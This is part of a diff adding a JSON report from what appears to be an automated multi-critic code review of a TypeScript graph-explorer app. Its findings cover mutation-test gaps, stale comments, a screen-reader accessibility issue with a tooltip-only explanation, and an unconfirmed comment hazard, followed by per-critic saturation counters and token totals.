+      "theme": "the explorer card's chip projection and its \"+N more\" counter can disagree with each other, or list a person as two steps from themselves, without any test noticing",
+      "file": "app/src/neighborhood.ts",
+      "line": 22,
+      "summary": "Two membership/counting properties of `neighborhood`/`relatedChips` that PersonPanel renders directly are unpinned; both mutations pass the suite.",
+      "failure": "Seeded mutations, each green across 315 tests: (1) drop `c !== focus` at `neighborhood.ts:22` \u2014 the focused person enters `second`, so PersonPanel renders them as their own \"Two steps away\" chip and `isShownRelated(adj, i, i)` becomes true, changing the back-stack trail rule; (2) `all.slice(0, SECOND_LIMIT)` \u2192 `all.slice(0, SECOND_LIMIT + 1)` at `neighborhood.ts:51` \u2014 25 chips render while `secondHidden` still counts `length - 24`, so one person is both shown and counted in \"+N more\" and the displayed count is off by one. Second-degree sets reach 132 at the degree cap, so the cutoff is live, not theoretical. A related boundary in the same class: `clamp.ts:54` `items.length <= limit` \u2192 `<` also survives, which would make a person with exactly 12 buddies announce as \"\u2026, and 0 more\" through `selectionStatusText`.",
+      "remediation": "Pin the projection's two structural properties over a generated graph and every focus index: focus is in neither bucket, the buckets are disjoint, and shown + hidden equals the full two-step count. Add the `clampList` equality boundary (`items.length === limit` renders no \"and N more\") in the same commit \u2014 same theme, one delimiter over.",
+      "invariant": "For every adjacency and every focus i: `!first.has(i) && !second.has(i)`, `first` and `second` are disjoint, and `relatedChips(adj,i).secondShown.length + relatedChips(adj,i).secondHidden === neighborhood(adj,i).second.size`; and for all items/limit, `clampList(items, limit)` contains \"and 0 more\" for no input."
+    },
+    {
+      "critic": "critic-solid",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "orphaned-invariant-comment",
+      "theme": "the fact 'report is null on the import path' is asserted independently in two files (importGraph.ts's construction and model.ts's consumption) with no shared symbol tying them together, so fixing the producer silently strands the consumer's comment and copy",
+      "file": "app/src/model.ts",
+      "line": 122,
+      "summary": "Implementing the follow-on this project has actually committed to (re-check buddy rules on import, using the core's own buildReport rather than a hand-rolled copy of the satisfaction predicate \u2014 exactly as prescribed in app/CLAUDE.md's 'Known follow-ons') makes model.ts:130's `report === null` branch dead in the live call graph, and turns the comment at model.ts:122-123 ('an imported constrained file has no report') false. I verified this by actually performing the wiring: after the fix, GraphView.report is null in exactly two situations \u2014 fromUnconstrained() in worker/generate.ts (reached only when there are zero constraints, so QualityPanel's `constraintSummary` already short-circuits on `total === 0` before ever reading `report`) and nowhere else, since fromConstrained() and the fixed importGraph.ts both always populate `report` whenever constraints exist. That leaves `constraintSummary`'s 'saved with this graph \u2014 not re-checked on import' string, and the comment explaining it, permanently unreachable from real data.",
+      "failure": "Import a file with constraints (e.g. `{required:[[0,1]]}`) after the fix and read the quality panel: it now correctly says 'all 1 buddy rule satisfied' (a genuine improvement), but model.ts:122-123's comment still claims imported files have no report, and the dead `report === null` branch/string remain, so a future reader trusts a comment the fix itself invalidated.",
+      "remediation": "When landing the buildReport wiring (importGraph.ts + lib export), remove or rewrite model.ts:119-134's comment and the now-unreachable `report === null` branch in the same commit, rather than leaving it to a later comment sweep \u2014 the fan-out for this follow-on is three files (lib/src/core/index.ts, app/src/io/importGraph.ts, app/src/model.ts), not the two the follow-on note names.",
+      "invariant": "for every GraphView v with v.constraints.length > 0 that is reachable from a real code path (generation or import), v.report !== null \u2014 i.e. `report === null && constraints.length > 0` is unreachable, so any UI string/comment keyed on that condition is dead and must not exist",
+      "caseOnly": false
+    },
+    {
+      "critic": "critic-maintainability",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "stale-comment",
+      "theme": "comment claims girth is not displayed when it is now used to derive displayed separation information",
+      "file": "/home/user/ringweave/app/src/model.ts",
+      "line": 67,
+      "summary": "Girth comment understates M3 usage: it is now displayed via separationShortfall.",
+      "failure": "Line 67 states: 'girth: number | null; // export-only (meta.metrics); not displayed in M2; null for a forest'. However, girth IS now displayed in M3: the separationShortfall() function (lines 255\u2013263) derives the displayed separation value directly from girth (got = girth - 1), and QualityPanel (lines 53\u201357 in QualityPanel.tsx) displays this shortfall to the user.",
+      "remediation": "Update the comment to reflect M3 usage: 'girth: number | null; // derived to show minimum-separation shortfall in QualityPanel; null for a forest'. Alternatively, remove the version reference entirely and state only the current usage.",
+      "invariant": "For any graph view where girth !== null and constraints.length === 0, separationShortfall must return a non-null result when got < asked, and this result must be rendered in the UI. The girth value is the ONLY source of truth for separation reporting (postulate: separation = girth - 1 per the core's own definition).",
+      "caseOnly": false
+    },
+    {
+      "critic": "critic-interaction",
+      "severity": "suggestion",
+      "verdict": "CONFIRMED",
+      "class": "mouse-only-explanation",
+      "theme": "a value's meaning is explained only through a pointer-hover mechanism, so a keyboard/screen-reader user reading the quality numbers gets a bare, unit-less digit with no way to learn what it measures",
+      "file": "app/src/panels/QualityPanel.tsx",
+      "line": 34,
+      "summary": "The connection-quality gauge's only explanation of what its number means ('how close to the theoretical best (Moore bound) this graph is. Zero when the group is split into disconnected sub-groups.') lives entirely in a `title` attribute on a non-focusable `<div className=\"gauge\">`. `title` is a mouse-hover tooltip; it is not exposed to keyboard users (the div has no `tabIndex`, so it can never receive focus and browsers generally do not surface `title` outside of a mouse hover/focus event) and most screen readers do not read `title` on non-interactive, unfocused elements at all. The visible number itself (`<div className=\"inner tabnum\">{q}</div>`) carries no unit either \u2014 no '%' character in the markup \u2014 so a screen reader lands on a bare integer with no indication it is a percentage or what it is a percentage of; the adjacent `connectionSummary` text ('everyone's well-linked for 4 buddies each' / 'not enough people yet to score') never restates the number or the word 'quality'/'percent', so the number and its explanation are never connected for anyone not sighted enough to read the tooltip.",
+      "failure": "A screen-reader user tabbing (or reading in document order with the screen off) through the metrics band after generating a graph hears, for the quality metric: the digits (e.g. '82') then 'everyone's well-linked for 4 buddies each' \u2014 with no announcement anywhere of the word 'percent', 'quality', or the Moore-bound explanation a sighted user can get by hovering the gauge. Contrast with the two neighboring metrics on the same panel, `aspl` and `diameter`, each of which pairs its number with an explicit label ('avg hops between any two people', 'most steps between anyone') in the accessible tree.",
+      "remediation": "Move the explanatory sentence (or a shorter equivalent, e.g. `${q}% connection quality \u2014 how close to the theoretical best for this many buddies`) into an `aria-label` on the `.gauge` div (or a visually-hidden text node inside it) so it is present in the accessible tree unconditionally, the same way `aspl`/`diameter` already pair their digits with a text label; keep `title` for the mouse tooltip if desired, but don't make it the only channel.",
+      "invariant": "Every piece of information exposed via a `title` attribute on a non-focusable element must also be reachable via the accessible name, accessible description, or an adjacent static/live text node of that element \u2014 i.e. no user-facing explanation should be reachable by pointer hover alone."
+    }
+  ],
+  "deferrals": [],
+  "plausible": [
+    {
+      "critic": "critic-correctness",
+      "severity": "suggestion",
+      "verdict": "PLAUSIBLE",
+      "class": "comment-claims-unreproducible-hazard",
+      "theme": "a guard is justified in a comment by a sequence I could not construct, so the comment asserts a live hazard the code's own structure appears to exclude",
+      "file": "app/src/App.tsx",
+      "line": 74,
+      "summary": "The comment above the `selected` range clamp says a selection can survive into a shorter replacement view because `resetSelection` runs before the asynchronous `bg.generate`; I could not produce that window, and deleting the clamp passes the suite.",
+      "failure": "Seeded mutation: `const selected = rawSelected;` (dropping `&& rawSelected < view.names.length`) \u2192 315 passed. Tracing the three graph-replacing paths, `resetSelection()` and the dispatch are in one React commit (`handleGenerate`, `handleReroll`, and `applyImported` \u2014 the last after an `await`, which React 19 still batches), so `explorer.current` is null from the next render onward, and `#app` is `inert` for the whole \"running\" window, so no new selection can be made before the shorter view lands. I could not construct the sequence the comment describes. I am filing this as PLAUSIBLE rather than CONFIRMED because failing to construct it is not proof it is unreachable, and the guard is cheap \u2014 the argument is about the comment asserting a mechanism, not about removing the clamp.",
+      "remediation": "Either demonstrate the window with a render test (which would also retire the mutation gap), or reword the comment to state what is actually true \u2014 that the index is defended because `PersonPanel` hands it to `eccentricity`, whose vertex guard throws and whose throw has no error boundary above it \u2014 and drop the causal story about the async dispatch. Do not remove the clamp.",
+      "invariant": "In every commit App produces, `explorer.current === null || (view !== null && explorer.current < view.names.length)` \u2014 checkable by a render test that selects a high index and then generates/imports a shorter roster."
+    }
+  ],
+  "saturation": {
+    "critic-correctness": {
+      "nothingFoundStreak": 0,
+      "lastRound": 21,
+      "skipped": false
+    },
+    "critic-security": {
+      "nothingFoundStreak": 2,
+      "lastRound": 21,
+      "skipped": false
+    },
+    "critic-solid": {
+      "nothingFoundStreak": 0,
+      "lastRound": 21,
+      "skipped": false
+    },
+    "critic-maintainability": {
+      "nothingFoundStreak": 0,
+      "lastRound": 21,
+      "skipped": false
+    },
+    "critic-interaction": {
+      "nothingFoundStreak": 0,
+      "lastRound": 21,
+      "skipped": false
+    }
+  },
+  "targetRaw": "app/src (the BuddyGraph app)",
+  "tokens": {
+    "subagentTokens": 597125,
+    "agents": 6,
+    "toolCalls": 235
+  }
+}
